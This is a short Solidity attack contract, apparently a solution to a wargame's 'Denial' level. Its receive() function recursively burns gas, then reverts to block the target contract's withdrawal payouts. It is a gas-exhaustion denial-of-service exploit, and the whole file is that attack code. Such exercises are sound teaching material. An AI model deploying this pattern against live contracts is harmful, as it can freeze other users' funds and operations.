// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./Denial.sol";

contract AttackingDenial {
    Denial public denial;

    constructor(address payable _contract) {
        denial = Denial(_contract);
    }

    receive() external payable {
        consumeGas();
    }

    function consumeGas() private {
        if (gasleft() < 2300) {
            revert("Gas consumption completed");
        }
        consumeGas();
    }

}
